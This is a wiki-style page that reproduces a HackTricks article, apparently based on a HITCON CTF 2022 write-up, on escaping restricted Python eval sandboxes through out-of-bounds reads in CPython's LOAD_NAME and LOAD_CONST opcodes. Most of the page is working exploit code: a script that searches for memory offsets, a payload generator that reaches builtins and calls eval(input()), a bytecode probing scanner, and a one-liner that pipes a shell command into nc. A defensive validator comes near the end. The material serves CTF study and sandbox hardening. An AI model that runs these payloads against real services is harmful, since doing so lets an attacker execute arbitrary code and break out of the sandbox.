---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# LOAD_NAME / LOAD_CONST opcode OOB Read

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-generic-methodologies-and-resources-python-bypass-python-sandboxes-load-name-load-const-opcode-oob-read` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/generic-methodologies-and-resources/python/bypass-python-sandboxes/load_name-load_const-opcode-oob-read.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [LOAD_NAME / LOAD_CONST opcode OOB Read](../../topics/generic-methodologies-and-resources/load-name-load-const-opcode-oob-read.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-generic-methodologies-and-resources-python-bypass-python-sandboxes-load-name-load-const-opcode-oob-read |
| name | LOAD_NAME / LOAD_CONST opcode OOB Read |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/generic-methodologies-and-resources/python/bypass-python-sandboxes/load_name-load_const-opcode-oob-read.md |

## Preserved Source Material

````yaml
_body: "# LOAD_NAME / LOAD_CONST opcode OOB Read\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n**This info was\
  \ taken** [**from this writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**\n\n### TL;DR <a href=\"#tldr-2\" id=\"\
  tldr-2\"></a>\n\nWe can use OOB read feature in LOAD_NAME / LOAD_CONST opcode to get some symbol in the memory. Which means\
  \ using trick like `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` to get\
  \ a symbol (such as function name) you want.\n\nThen just craft your exploit.\n\n### Overview <a href=\"#overview-1\" id=\"\
  overview-1\"></a>\n\nThe source code is pretty short, only contains 4 lines!\n\n```python\nsource = input('>>> ')\nif len(source)\
  \ > 13337: exit(print(f\"{'L':O<13337}NG\"))\ncode = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())\nprint(eval(code,\
  \ {'__builtins__': {}}))1234\n```\n\nYou can input arbitrary Python code, and it'll be compiled to a [Python code object](https://docs.python.org/3/c-api/code.html).\
  \ However `co_consts` and `co_names` of that code object will be replaced with an empty tuple before eval that code object.\n\
  \nSo in this way, all the expression contains consts (e.g. numbers, strings etc.) or names (e.g. variables, functions) might\
  \ cause segmentation fault in the end.\n\n### Out of Bound Read <a href=\"#out-of-bound-read\" id=\"out-of-bound-read\"\
  ></a>\n\nHow does the segfault happen?\n\nLet's start with a simple example, `[a, b, c]` could compile into the following\
  \ bytecode.\n\n```\n  1           0 LOAD_NAME                0 (a)\n              2 LOAD_NAME                1 (b)\n   \
  \           4 LOAD_NAME                2 (c)\n              6 BUILD_LIST               3\n              8 RETURN_VALUE12345\n\
  ```\n\nBut what if the `co_names` become empty tuple? The `LOAD_NAME 2` opcode is still executed, and try to read value\
  \ from that memory address it originally should be. Yes, this is an out-of-bound read \"feature\".\n\nThe core concept for\
  \ the solution is simple. Some opcodes in CPython for example `LOAD_NAME` and `LOAD_CONST` are vulnerable (?) to OOB read.\n\
  \nThey retrieve an object from index `oparg` from the `consts` or `names` tuple (that's what `co_consts` and `co_names`\
  \ named under the hood). We can refer to the following short snippest about `LOAD_CONST` to see what CPython does when it\
  \ proccesses to `LOAD_CONST` opcode.\n\n```c\ncase TARGET(LOAD_CONST): {\n    PREDICTED(LOAD_CONST);\n    PyObject *value\
  \ = GETITEM(consts, oparg);\n    Py_INCREF(value);\n    PUSH(value);\n    FAST_DISPATCH();\n}1234567\n```\n\nIn this way\
  \ we can use the OOB feature to get a \"name\" from arbitrary memory offset. To make sure what name it has and what's it's\
  \ offset, just keep trying `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... And you could find something in about oparg\
  \ > 700. You can also try to use gdb to take a look at the memory layout of course, but I don't think it would be more easier?\n\
  \n### Generating the Exploit <a href=\"#generating-the-exploit\" id=\"generating-the-exploit\"></a>\n\nOnce we retrieve\
  \ those useful offsets for names / consts, how _do_ we get a name / const from that offset and use it? Here is a trick for\
  \ you:\\\nLet's assume we can get a `__getattribute__` name from offset 5 (`LOAD_NAME 5`) with `co_names=()`, then just\
  \ do the following stuff:\n\n```python\n[a,b,c,d,e,__getattribute__] if [] else [\n    [].__getattribute__\n    # you can\
  \ get the __getattribute__ method of list object now!\n]1234\n```\n\n> Notice that it is not necessary to name it as `__getattribute__`,\
  \ you can name it as something shorter or more weird\n\nYou can understand the reason behind by just viewing it's bytecode:\n\
  \n```python\n              0 BUILD_LIST               0\n              2 POP_JUMP_IF_FALSE       20\n        >>    4 LOAD_NAME\
  \                0 (a)\n        >>    6 LOAD_NAME                1 (b)\n        >>    8 LOAD_NAME                2 (c)\n\
  \        >>   10 LOAD_NAME                3 (d)\n        >>   12 LOAD_NAME                4 (e)\n        >>   14 LOAD_NAME\
  \                5 (__getattribute__)\n             16 BUILD_LIST               6\n             18 RETURN_VALUE\n      \
  \       20 BUILD_LIST               0\n        >>   22 LOAD_ATTR                5 (__getattribute__)\n             24 BUILD_LIST\
  \               1\n             26 RETURN_VALUE1234567891011121314\n```\n\nNotice that `LOAD_ATTR` also retrieve the name\
  \ from `co_names`. Python loads names from the same offset if the name is the same, so the second `__getattribute__` is\
  \ still loaded from offset=5. Using this feature we can use arbitrary name once the name is in the memory nearby.\n\nFor\
  \ generating numbers should be trivial:\n\n- 0: not \\[\\[]]\n- 1: not \\[]\n- 2: (not \\[]) + (not \\[])\n- ...\n\n###\
  \ Exploit Script <a href=\"#exploit-script-1\" id=\"exploit-script-1\"></a>\n\nI didn't use consts due to the length limit.\n\
  \nFirst here is a script for us to find those offsets of names.\n\n```python\nfrom types import CodeType\nfrom opcode import\
  \ opmap\nfrom sys import argv\n\n\nclass MockBuiltins(dict):\n    def __getitem__(self, k):\n        if type(k) == str:\n\
  \            return k\n\n\nif __name__ == '__main__':\n    n = int(argv[1])\n\n    code = [\n        *([opmap['EXTENDED_ARG'],\
  \ n // 256]\n          if n // 256 != 0 else []),\n        opmap['LOAD_NAME'], n % 256,\n        opmap['RETURN_VALUE'],\
  \ 0\n    ]\n\n    c = CodeType(\n        0, 0, 0, 0, 0, 0,\n        bytes(code),\n        (), (), (), '<sandbox>', '<eval>',\
  \ 0, b'', ()\n    )\n\n    ret = eval(c, {'__builtins__': MockBuiltins()})\n    if ret:\n        print(f'{n}: {ret}')\n\n\
  # for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132\n```\n\nAnd\
  \ the following is for generating the real Python exploit.\n\n```python\nimport sys\nimport unicodedata\n\n\nclass Generator:\n\
  \    # get numner\n    def __call__(self, num):\n        if num == 0:\n            return '(not[[]])'\n        return '('\
  \ + ('(not[])+' * num)[:-1] + ')'\n\n    # get string\n    def __getattribute__(self, name):\n        try:\n           \
  \ offset = None.__dir__().index(name)\n            return f'keys[{self(offset)}]'\n        except ValueError:\n        \
  \    offset = None.__class__.__dir__(None.__class__).index(name)\n            return f'keys2[{self(offset)}]'\n\n\n_ = Generator()\n\
  \nnames = []\nchr_code = 0\nfor x in range(4700):\n    while True:\n        chr_code += 1\n        char = unicodedata.normalize('NFKC',\
  \ chr(chr_code))\n        if char.isidentifier() and char not in names:\n            names.append(char)\n            break\n\
  \noffsets = {\n    \"__delitem__\": 2800,\n    \"__getattribute__\": 2850,\n    '__dir__': 4693,\n    '__repr__': 2128,\n\
  }\n\nvariables = ('keys', 'keys2', 'None_', 'NoneType',\n             'm_repr', 'globals', 'builtins',)\n\nfor name, offset\
  \ in offsets.items():\n    names[offset] = name\n\nfor i, var in enumerate(variables):\n    assert var not in offsets\n\
  \    names[792 + i] = var\n\n\nsource = f'''[\n({\",\".join(names)}) if [] else [],\nNone_ := [[]].__delitem__({_(0)}),\n\
  keys := None_.__dir__(),\nNoneType := None_.__getattribute__({_.__class__}),\nkeys2 := NoneType.__dir__(NoneType),\nget\
  \ := NoneType.__getattribute__,\nm_repr := get(\n    get(get([],{_.__class__}),{_.__base__}),\n    {_.__subclasses__}\n\
  )()[-{_(2)}].__repr__,\nglobals := get(m_repr, m_repr.__dir__()[{_(6)}]),\nbuiltins := globals[[*globals][{_(7)}]],\nbuiltins[[*builtins][{_(19)}]](\n\
  \    builtins[[*builtins][{_(28)}]](), builtins\n)\n]'''.strip().replace('\\n', '').replace(' ', '')\n\nprint(f\"{len(source)\
  \ = }\", file=sys.stderr)\nprint(source)\n\n# (python exp.py; echo '__import__(\"os\").system(\"sh\")'; cat -) | nc challenge.server\
  \ port\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273\n\
  ```\n\nIt basically does the following things, for those strings we get it from the `__dir__` method:\n\n```python\ngetattr\
  \ = (None).__getattribute__('__class__').__getattribute__\nbuiltins = getattr(\n  getattr(\n    getattr(\n      [].__getattribute__('__class__'),\n\
  \    '__base__'),\n  '__subclasses__'\n  )()[-2],\n'__repr__').__getattribute__('__globals__')['builtins']\nbuiltins['eval'](builtins['input']())\n\
  ```\n\n---\n\n### Version notes and affected opcodes (Python 3.11–3.13)\n\n- CPython bytecode opcodes still index into `co_consts`\
  \ and `co_names` tuples by integer operands. If an attacker can force these tuples to be empty (or smaller than the maximum\
  \ index used by the bytecode), the interpreter will read out-of-bounds memory for that index, yielding an arbitrary PyObject\
  \ pointer from nearby memory. Relevant opcodes include at least:\n  - `LOAD_CONST consti` → reads `co_consts[consti]`.\n\
  \  - `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`,\
  \ `STORE_ATTR` → read names from `co_names[...]` (for 3.11+ note `LOAD_ATTR`/`LOAD_GLOBAL` store flag bits in the low bit;\
  \ the actual index is `namei >> 1`). See the disassembler docs for exact semantics per version. [Python dis docs].\n- Python\
  \ 3.11+ introduced adaptive/inline caches that add hidden `CACHE` entries between instructions. This doesn’t change the\
  \ OOB primitive; it only means that if you handcraft bytecode, you must account for those cache entries when building `co_code`.\n\
  \nPractical implication: the technique in this page continues to work on CPython 3.11, 3.12 and 3.13 when you can control\
  \ a code object (e.g., via `CodeType.replace(...)`) and shrink `co_consts`/`co_names`.\n\n### Quick scanner for useful OOB\
  \ indexes (3.11+/3.12+ compatible)\n\nIf you prefer to probe for interesting objects directly from bytecode rather than\
  \ from high-level source, you can generate minimal code objects and brute force indices. The helper below automatically\
  \ inserts inline caches when needed.\n\n```python\nimport dis, types\n\ndef assemble(ops):\n    # ops: list of (opname,\
  \ arg) pairs\n    cache = bytes([dis.opmap.get(\"CACHE\", 0), 0])\n    out = bytearray()\n    for op, arg in ops:\n    \
  \    opc = dis.opmap[op]\n        out += bytes([opc, arg])\n        # Python >=3.11 inserts per-opcode inline cache entries\n\
  \        ncache = getattr(dis, \"_inline_cache_entries\", {}).get(opc, 0)\n        out += cache * ncache\n    return bytes(out)\n\
  \n# Reuse an existing function's code layout to simplify CodeType construction\nbase = (lambda: None).__code__\n\n# Example:\
  \ probe co_consts[i] with LOAD_CONST i and return it\n# co_consts/co_names are intentionally empty so LOAD_* goes OOB\n\n\
  def probe_const(i):\n    code = assemble([\n        (\"RESUME\", 0),          # 3.11+\n        (\"LOAD_CONST\", i),\n  \
  \      (\"RETURN_VALUE\", 0),\n    ])\n    c = base.replace(co_code=code, co_consts=(), co_names=())\n    try:\n       \
  \ return eval(c)\n    except Exception:\n        return None\n\nfor idx in range(0, 300):\n    obj = probe_const(idx)\n\
  \    if obj is not None:\n        print(idx, type(obj), repr(obj)[:80])\n```\n\nNotes\n- To probe names instead, swap `LOAD_CONST`\
  \ for `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` and adjust your stack usage accordingly.\n- Use `EXTENDED_ARG` or multiple bytes\
  \ of `arg` to reach indexes >255 if needed. When building with `dis` as above, you only control the low byte; for larger\
  \ indexes, construct the raw bytes yourself or split the attack across multiple loads.\n\n### Minimal bytecode-only RCE\
  \ pattern (co_consts OOB → builtins → eval/input)\n\nOnce you have identified a `co_consts` index that resolves to the builtins\
  \ module, you can reconstruct `eval(input())` without any `co_names` by manipulating the stack:\n\n```python\n# Build co_code\
  \ that:\n# 1) LOAD_CONST <builtins_idx> → push builtins module\n# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel\
  \ strings like 'input'/'eval'\n#    out of objects living nearby in memory (e.g., from method tables),\n# 3) BINARY_SUBSCR\
  \ to do builtins[\"input\"] / builtins[\"eval\"], CALL each, and RETURN_VALUE\n# This pattern is the same idea as the high-level\
  \ exploit above, but expressed in raw bytecode.\n```\n\nThis approach is useful in challenges that give you direct control\
  \ over `co_code` while forcing `co_consts=()` and `co_names=()` (e.g., BCTF 2024 “awpcode”). It avoids source-level tricks\
  \ and keeps payload size small by leveraging bytecode stack ops and tuple builders.\n\n### Defensive checks and mitigations\
  \ for sandboxes\n\nIf you are writing a Python “sandbox” that compiles/evaluates untrusted code or manipulates code objects,\
  \ do not rely on CPython to bounds-check tuple indexes used by bytecode. Instead, validate code objects yourself before\
  \ executing them.\n\nPractical validator (rejects OOB access to co_consts/co_names)\n\n```python\nimport dis\n\ndef max_name_index(code):\n\
  \    max_idx = -1\n    for ins in dis.get_instructions(code):\n        if ins.opname in {\"LOAD_NAME\",\"STORE_NAME\",\"\
  DELETE_NAME\",\"IMPORT_NAME\",\n                          \"IMPORT_FROM\",\"STORE_ATTR\",\"LOAD_ATTR\",\"LOAD_GLOBAL\",\"\
  DELETE_GLOBAL\"}:\n            namei = ins.arg or 0\n            # 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low\
  \ bit\n            if ins.opname in {\"LOAD_ATTR\",\"LOAD_GLOBAL\"}:\n                namei >>= 1\n            max_idx =\
  \ max(max_idx, namei)\n    return max_idx\n\ndef max_const_index(code):\n    return max([ins.arg for ins in dis.get_instructions(code)\n\
  \                if ins.opname == \"LOAD_CONST\"] + [-1])\n\ndef validate_code_object(code: type((lambda:0).__code__)):\n\
  \    if max_const_index(code) >= len(code.co_consts):\n        raise ValueError(\"Bytecode refers to const index beyond\
  \ co_consts length\")\n    if max_name_index(code) >= len(code.co_names):\n        raise ValueError(\"Bytecode refers to\
  \ name index beyond co_names length\")\n\n# Example use in a sandbox:\n# src = input(); c = compile(src, '<sandbox>', 'exec')\n\
  # c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first\n# validate_code_object(c)\n\
  # eval(c, {'__builtins__': {}})\n```\n\nAdditional mitigation ideas\n- Don’t allow arbitrary `CodeType.replace(...)` on\
  \ untrusted input, or add strict structural checks on the resulting code object.\n- Consider running untrusted code in a\
  \ separate process with OS-level sandboxing (seccomp, job objects, containers) instead of relying on CPython semantics.\n\
  \n\n\n## References\n\n- Splitline’s HITCON CTF 2022 writeup “V O I D” (origin of this technique and high-level exploit\
  \ chain): https://blog.splitline.tw/hitcon-ctf-2022/\n- Python disassembler docs (indices semantics for LOAD_CONST/LOAD_NAME/etc.,\
  \ and 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` low-bit flags): https://docs.python.org/3.13/library/dis.html\n{{#include ../../../banners/hacktricks-training.md}}"
_relative_path: generic-methodologies-and-resources/python/bypass-python-sandboxes/load_name-load_const-opcode-oob-read.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/generic-methodologies-and-resources/python/bypass-python-sandboxes/load_name-load_const-opcode-oob-read.md
````
